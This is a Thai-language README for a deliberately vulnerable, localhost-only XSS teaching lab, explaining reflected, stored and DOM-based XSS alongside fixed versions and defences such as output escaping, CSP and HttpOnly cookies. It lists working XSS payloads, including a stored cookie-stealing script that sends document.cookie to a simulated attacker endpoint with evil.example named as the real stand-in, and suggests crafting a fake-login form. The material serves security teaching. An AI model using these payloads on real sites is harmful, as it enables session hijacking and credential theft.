# XSS Lab — แล็บฝึกทำความเข้าใจ Cross-Site Scripting

> ⚠ **เว็บนี้ตั้งใจเขียนให้มีช่องโหว่** ใช้เรียนรู้บนเครื่องตัวเองเท่านั้น
> ห้ามเอาขึ้นเซิร์ฟเวอร์จริง และห้ามเอา payload ไปลองกับเว็บที่ไม่ได้รับอนุญาต (ผิด พ.ร.บ. คอมพิวเตอร์ฯ)

---

## 1. XSS คืออะไร

**XSS (Cross-Site Scripting)** คือช่องโหว่ที่ทำให้แฮกเกอร์ **แอบใส่ JavaScript ของตัวเองลงในหน้าเว็บของคนอื่น**
แล้วโค้ดนั้นไปรันในเบราว์เซอร์ของเหยื่อ

ต้นเหตุมีข้อเดียว:

> **เว็บเอาข้อมูลที่ผู้ใช้ส่งมา ไปใส่ในหน้า HTML ตรงๆ โดยไม่แปลงให้เป็นข้อความธรรมดาก่อน**

ตัวอย่างง่ายที่สุด เว็บค้นหาเขียนแบบนี้:

```js
html = '<p>ผลการค้นหาสำหรับ: ' + q + '</p>';
```

ถ้าผู้ใช้พิมพ์ `รองเท้า` ก็ได้ `<p>ผลการค้นหาสำหรับ: รองเท้า</p>` ปกติดี
แต่ถ้าพิมพ์ `<script>alert(1)</script>` ก็จะได้

```html
<p>ผลการค้นหาสำหรับ: <script>alert(1)</script></p>
```

เบราว์เซอร์ไม่รู้ว่าส่วนไหนเป็น "ข้อมูล" ส่วนไหนเป็น "โค้ด" มันเห็นแท็ก `<script>` ก็รันเลย

### แฮกเกอร์เอาไปทำอะไรได้

เมื่อโค้ดของแฮกเกอร์รันในหน้าเว็บของเรา มันทำได้ **ทุกอย่างที่ผู้ใช้คนนั้นทำได้บนเว็บนั้น** เช่น

- ขโมยคุกกี้ / session แล้วเข้าบัญชีเหยื่อได้เลย (session hijacking)
- กดปุ่ม โอนเงิน เปลี่ยนรหัสผ่าน แทนเหยื่อ
- แสดงฟอร์ม login ปลอมทับหน้าจริง เพื่อหลอกเอารหัสผ่าน
- แก้หน้าตาเว็บ (defacement)
- ดักทุกปุ่มที่เหยื่อพิมพ์ (keylogger)

---

## 2. วิธีรัน

ต้องมี [Node.js](https://nodejs.org) (เวอร์ชัน 18 ขึ้นไป) **ไม่ต้อง npm install อะไรเลย**

```bash
node server.js
```

แล้วเปิดเบราว์เซอร์ไปที่ <http://localhost:3000>

เซิร์ฟเวอร์ฟังเฉพาะ `127.0.0.1` คนอื่นในวง LAN เข้าไม่ได้

### โครงสร้างไฟล์

```
XSS/
├── server.js          ← เซิร์ฟเวอร์ทั้งหมด (Lab 1, 2 และหน้าแฮกเกอร์)
├── public/
│   ├── dom-vuln.js    ← โค้ดฝั่งเบราว์เซอร์ Lab 3 (มีช่องโหว่)
│   ├── dom-safe.js    ← โค้ดฝั่งเบราว์เซอร์ Lab 3 (แก้แล้ว)
│   └── style.css
├── package.json
└── README.md          ← ไฟล์นี้
```

ทุก Lab มี 2 หน้าให้เทียบกัน

| Lab | ชนิด | มีช่องโหว่ | แก้แล้ว |
|---|---|---|---|
| 1 | Reflected XSS | `/search` | `/safe/search` |
| 2 | Stored XSS | `/guestbook` | `/safe/guestbook` |
| 3 | DOM-based XSS | `/dom` | `/safe/dom` |
| – | เซิร์ฟเวอร์แฮกเกอร์ (จำลอง) | `/attacker` | |

เว็บตั้งคุกกี้จำลองไว้ 2 ตัว เพื่อดูว่า XSS ขโมยอะไรได้บ้าง

| คุกกี้ | HttpOnly | JavaScript อ่านได้ไหม |
|---|---|---|
| `session=demo-user-1234` | ไม่มี | ได้ → ขโมยได้ |
| `secret_session=httponly-5678` | มี | ไม่ได้ |

---

## 3. XSS มี 3 แบบ

| แบบ | payload อยู่ที่ไหน | ใครโดน | ความรุนแรง |
|---|---|---|---|
| **Reflected** | ใน URL ที่ส่งให้เหยื่อกด | คนที่กดลิงก์ | ปานกลาง (ต้องหลอกให้กด) |
| **Stored** | เก็บในฐานข้อมูลของเว็บ | **ทุกคน** ที่เปิดหน้านั้น | สูง |
| **DOM-based** | ใน URL แต่ JavaScript ฝั่งเบราว์เซอร์เป็นคนเอาไปใส่ | คนที่กดลิงก์ | ปานกลาง (เซิร์ฟเวอร์มองไม่เห็นเลย) |

---

## 4. Lab 1 — Reflected XSS (`/search`)

### สถานการณ์
ร้านค้าออนไลน์มีช่องค้นหา คำค้นจะอยู่ใน URL เช่น `/search?q=รองเท้า`
แล้วเซิร์ฟเวอร์เอาคำนั้นใส่กลับมาในหน้าเว็บ ("สะท้อน" กลับมา จึงเรียกว่า Reflected)

### โค้ดที่มีปัญหา (`server.js` ฟังก์ชัน `searchPage`)

```js
const out = safe ? escapeHtml(q) : q;   // หน้า vuln ใช้ q ตรงๆ

`<input name="q" value="${out}">`               // จุดที่ 1: ใน attribute
`ผลการค้นหาสำหรับ: <b>${out}</b>`               // จุดที่ 2: ใน HTML
```

### ลองโจมตี
พิมพ์ในช่องค้นหา หรือกดปุ่ม "ลอง" ในหน้าเว็บ

| payload | ทำงานยังไง |
|---|---|
| `<script>alert('XSS')</script>` | แท็ก script ธรรมดา |
| `<img src=x onerror="alert(document.cookie)">` | รูป `x` โหลดไม่ได้ → `onerror` ทำงาน → แสดงคุกกี้ |
| `"><svg onload=alert(1)>` | `"` ปิด `value="..."` ก่อน, `>` ปิดแท็ก input แล้วค่อยใส่แท็กใหม่ |
| `" autofocus onfocus="alert('attr')` | ไม่ใช้ `< >` เลย แค่เพิ่ม attribute ใหม่ให้ input |

**ข้อสังเกตสำคัญ:** หลังโจมตี ลองดู `alert(document.cookie)` จะเห็นแค่ `session=...`
ไม่เห็น `secret_session` เพราะตัวนั้นเป็น HttpOnly

### ในชีวิตจริงโจมตียังไง
แฮกเกอร์สร้างลิงก์ เช่น

```
http://shop.example/search?q=<script>...ขโมยคุกกี้...</script>
```

แล้วย่อลิงก์ / ส่งในแชท / ส่งอีเมล เหยื่อที่ล็อกอินอยู่แล้วกด → โค้ดรันในชื่อของเว็บ shop.example

---

## 5. Lab 2 — Stored XSS (`/guestbook`)

### สถานการณ์
สมุดเยี่ยม / ช่องคอมเมนต์ ข้อความ **ถูกเก็บไว้ในเซิร์ฟเวอร์** แล้วแสดงให้ทุกคนที่เข้ามาดู
แฮกเกอร์โพสต์ครั้งเดียว ทุกคนที่เปิดหน้านี้โดนหมด ไม่ต้องหลอกให้กดลิงก์

### โค้ดที่มีปัญหา (`server.js` ฟังก์ชัน `guestbookPage`)

```js
const show = safe ? escapeHtml : (s) => s;      // หน้า vuln แสดงตรงๆ
`<b>${show(c.name)}</b><div>${show(c.text)}</div>`
```

### ลองโจมตี — ขโมยคุกกี้แบบเห็นภาพ

1. เปิด `/guestbook` แล้วโพสต์ข้อความนี้

   ```html
   <script>new Image().src='/attacker/collect?c='+encodeURIComponent(document.cookie)</script>
   ```

2. หน้าเว็บดูปกติ ไม่มีอะไรเด้ง (นี่แหละที่น่ากลัว)
3. เปิด `/attacker` จะเห็นว่าแฮกเกอร์ได้คุกกี้ `session=demo-user-1234` ไปแล้ว
   และใน terminal ที่รันเซิร์ฟเวอร์จะขึ้นข้อความสีแดง `[ATTACKER] ได้คุกกี้: ...`
4. เปิดหน้า `/guestbook` ใหม่อีกครั้ง หรือเปิดจากแท็บ incognito → โดนขโมยซ้ำทุกครั้ง

**payload นี้ทำงานยังไง:** สร้างรูปภาพที่มี URL เป็นเซิร์ฟเวอร์ของแฮกเกอร์ และแนบคุกกี้ไปใน URL
เบราว์เซอร์จะส่ง request ไปเองโดยอัตโนมัติเพื่อ "โหลดรูป" ทำให้ข้อมูลไปถึงแฮกเกอร์แบบเงียบๆ
(ในชีวิตจริง `/attacker/collect` จะเป็นโดเมนของแฮกเกอร์ เช่น `https://evil.example/collect`)

5. **ลองเปิด `/safe/guestbook`** ข้อมูลชุดเดียวกันเป๊ะ แต่ payload ถูกแสดงเป็นตัวหนังสือธรรมดา ไม่ทำงาน

---

## 6. Lab 3 — DOM-based XSS (`/dom`)

### สถานการณ์
หน้าเว็บทักทายด้วยชื่อที่อยู่หลัง `#` ใน URL เช่น `/dom#สมชาย` → "สวัสดีครับคุณ สมชาย"

ส่วนหลัง `#` (เรียกว่า fragment / hash) **ไม่ถูกส่งไปที่เซิร์ฟเวอร์เลย**
ดังนั้นต่อให้เซิร์ฟเวอร์ escape ดีแค่ไหนก็ช่วยไม่ได้ ปัญหาอยู่ใน JavaScript ฝั่งเบราว์เซอร์ล้วนๆ

### โค้ดที่มีปัญหา (`public/dom-vuln.js`)

```js
const name = decodeURIComponent(location.hash.slice(1));   // SOURCE: ข้อมูลจากผู้ใช้
document.getElementById('greeting').innerHTML = 'สวัสดีครับคุณ ' + name;  // SINK: จุดอันตราย
```

ศัพท์ที่ควรรู้:
- **Source** = ที่มาของข้อมูลที่ผู้ใช้ควบคุมได้ เช่น `location.hash`, `location.search`, `document.referrer`, `postMessage`
- **Sink** = จุดที่ถ้าข้อมูลไหลมาถึงแล้วกลายเป็นโค้ด เช่น `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout("string")`, `element.src = 'javascript:...'`

DOM XSS = ข้อมูลไหลจาก source ไปถึง sink โดยไม่ถูกกรอง

### ลองโจมตี

| payload | ผล |
|---|---|
| `<img src=x onerror="alert(document.cookie)">` | ✅ ได้ผล |
| `<script>alert(1)</script>` | ❌ **ไม่ได้ผล** — `innerHTML` ไม่รันแท็ก `<script>` |
| `<iframe src="javascript:alert('iframe')">` | ✅ ได้ผล |

ข้อ 2 เป็นกับดักที่คนชอบเข้าใจผิด: "ลอง `<script>` แล้วไม่เด้ง แปลว่าปลอดภัย" — **ไม่จริง** แค่ต้องใช้ payload แบบอื่น

---

## 7. วิธีป้องกัน

### ✅ ชั้นที่ 1 (สำคัญที่สุด): Output Encoding — escape ตอนแสดงผล

แปลงอักขระพิเศษให้เป็น HTML entity ก่อนใส่ลงหน้าเว็บ (ดู `escapeHtml` ใน `server.js`)

| อักขระ | กลายเป็น |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |
| `&` | `&amp;` |

เบราว์เซอร์จะ **แสดง** `<script>` บนจอให้เห็น แต่ **ไม่ตีความ** เป็นแท็ก

```js
// ❌
html = '<b>' + q + '</b>';
// ✅
html = '<b>' + escapeHtml(q) + '</b>';
```

ฝั่ง JavaScript ในเบราว์เซอร์ ใช้ `textContent` แทน `innerHTML` (ดู `public/dom-safe.js`)

```js
// ❌
el.innerHTML = 'สวัสดี ' + name;
// ✅
el.textContent = 'สวัสดี ' + name;
```

> **ใช้ framework ช่วย:** React, Vue, Angular, หรือ template engine อย่าง EJS (`<%= %>`), Jinja2, Blade
> escape ให้อัตโนมัติ แต่จะกลับมาอันตรายทันทีถ้าใช้ทางลัด เช่น
> `dangerouslySetInnerHTML` (React), `v-html` (Vue), `<%- %>` (EJS), `|safe` (Jinja2), `{!! !!}` (Blade)

> **ถ้าจำเป็นต้องให้ผู้ใช้ใส่ HTML ได้จริงๆ** (เช่น editor บทความ) ให้ใช้ไลบรารี sanitizer อย่าง
> [DOMPurify](https://github.com/cure53/DOMPurify) อย่าเขียนตัวกรองเอง

### ✅ ชั้นที่ 2: Content Security Policy (CSP)

HTTP header ที่บอกเบราว์เซอร์ว่า "อนุญาตให้รันสคริปต์จากที่ไหนบ้าง" หน้า `/safe/*` ใช้แบบนี้

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```

`script-src 'self'` = รันได้เฉพาะไฟล์ `.js` จากเว็บเราเอง → สคริปต์ที่ฝังในหน้า (`<script>...</script>`, `onerror=...`)
จะถูกบล็อก ต่อให้หลุด escape ไปได้ก็ยังมีชั้นนี้กันไว้

ลองดูได้: เปิด DevTools (F12) → แท็บ Network → คลิก request ของหน้า `/safe/search` → ดู Response Headers

### ✅ ชั้นที่ 3: คุกกี้ HttpOnly

คุกกี้ที่มี `HttpOnly` JavaScript จะอ่านไม่ได้ (`document.cookie` มองไม่เห็น)
XSS จึงขโมย session ตรงๆ ไม่ได้ (แต่ยังทำอย่างอื่นแทนผู้ใช้ได้อยู่ ไม่ใช่ทางแก้หลัก)

```
Set-Cookie: secret_session=...; HttpOnly; Secure; SameSite=Lax
```

### ⚠ ที่ "ไม่พอ" หรือ "ผิด"

| วิธี | ทำไมไม่พอ |
|---|---|
| ลบคำว่า `<script>` ออก | ใช้ `<img onerror>`, `<svg onload>` แทนได้ หรือเขียน `<scr<script>ipt>` |
| กรองแค่ตอนรับ input | ข้อมูลเดียวกันอาจไปแสดงในหลายบริบท (HTML, attribute, JS, URL) ต้อง escape ให้ตรงบริบทตอนแสดง |
| เช็กแค่ฝั่ง JavaScript หน้าเว็บ | แฮกเกอร์ยิง request ตรงไปเซิร์ฟเวอร์ได้ ข้ามหน้าเว็บไปเลย |
| ใช้ blacklist คำอันตราย | มีวิธีเลี่ยงเยอะมาก ใช้ escape / allowlist ดีกว่า |

---

## 8. สรุปสั้นๆ (จำไว้ข้อเดียวก็ได้)

> **อย่าเชื่อข้อมูลจากผู้ใช้ — escape ทุกครั้งที่เอาไปแสดง ให้ตรงกับบริบทที่แสดง**

Checklist ก่อนปล่อยเว็บ:

- [ ] ทุกจุดที่แสดงข้อมูลผู้ใช้ผ่าน escape หรือ framework ที่ escape อัตโนมัติ
- [ ] ไม่ใช้ `innerHTML` / `v-html` / `dangerouslySetInnerHTML` กับข้อมูลจากผู้ใช้
- [ ] ถ้าต้องรับ HTML จากผู้ใช้ ใช้ DOMPurify
- [ ] ตั้ง CSP header
- [ ] คุกกี้ session เป็น `HttpOnly; Secure; SameSite`

---

## 9. แบบฝึกหัดต่อยอด

1. เปิด DevTools (F12) → Elements แล้วดูว่า payload ในหน้า `/search` กับ `/safe/search` กลายเป็น HTML ต่างกันยังไง
2. ใน `searchPage` ของ `server.js` เปลี่ยน `const out = safe ? escapeHtml(q) : q;` เป็น `const out = q;`
   (หน้า safe จะเหลือแค่ CSP กันอยู่ชั้นเดียว) แล้วลอง payload ใน `/safe/search` ดูว่าเด้งไหม และดู error สีแดงใน Console (F12)
3. ลองเขียน payload ที่แสดงฟอร์ม login ปลอมใน `/guestbook`
4. ลองเอา `'"': '&quot;'` ออกจาก `escapeHtml` แล้วเปิด DevTools → Elements ดูว่า payload `" autofocus onfocus="alert('attr')`
   ใน `/safe/search` แทรก attribute เข้าไปใน `<input>` ได้ไหม และอะไรยังกันไม่ให้มันรัน

---

## อ้างอิง

- OWASP — Cross Site Scripting Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP — DOM based XSS Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
- PortSwigger Web Security Academy (แล็บฝึกฟรี): <https://portswigger.net/web-security/cross-site-scripting>
- MDN — Content Security Policy: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>
